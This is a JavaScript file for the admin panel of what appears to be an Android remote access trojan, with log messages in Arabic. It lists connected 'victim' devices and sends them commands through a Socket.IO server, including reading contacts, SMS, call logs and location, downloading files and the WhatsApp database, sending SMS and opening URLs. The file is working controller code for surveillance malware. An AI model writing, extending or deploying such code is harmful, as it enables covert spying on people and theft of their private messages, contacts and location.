const socket = io();
socket.emit('adminJoin');

let devices = {};
socket.on('join', (device) => {
  devices[device.id] = device;
  updateDeviceList();
  addLog(`جهاز متصل: ${device.id} (${device.model})`);
});

const victimEvents = ['getDir','getInstalledApps','getContacts','sendSMS','getCallLog','previewImage','getSMS','getLocation','download','downloadWhatsappDatabase','openUrl','downloadFile'];
victimEvents.forEach(ev => { socket.on(ev, data => addLog(`رد من الجهاز: ${ev} => ${JSON.stringify(data)}`)); });

socket.on('disconnectClient', socketId => {
  for(let id in devices){ if(devices[id].socketId === socketId){ addLog(`انقطع الاتصال بالجهاز: ${id}`); delete devices[id]; updateDeviceList(); break; } }
});

function updateDeviceList(){
  const ul = document.getElementById('deviceList'); const select = document.getElementById('deviceSelect'); ul.innerHTML = ''; select.innerHTML = '';
  for(let id in devices){ const li = document.createElement('li'); li.textContent = `${id} (${devices[id].model})`; ul.appendChild(li);
  const option = document.createElement('option'); option.value=id; option.textContent=`${id} (${devices[id].model})`; select.appendChild(option); }
}

function addLog(msg){ const ul = document.getElementById('logList'); const li = document.createElement('li'); li.textContent=`[${new Date().toLocaleTimeString()}] ${msg}`; ul.appendChild(li); ul.scrollTop = ul.scrollHeight; }

document.getElementById('sendCommand').addEventListener('click', () => {
  const to = document.getElementById('deviceSelect').value; const action = document.getElementById('commandAction').value.trim();
  let data = document.getElementById('commandData').value.trim();
  if(data){ try{ data=JSON.parse(data); } catch(e){ addLog('خطأ: بيانات الأمر ليست JSON صحيحة'); return;} } else data=null;
  socket.emit('request', JSON.stringify({to, action, data})); addLog(`تم إرسال الأمر: ${action} إلى ${to}`);
});
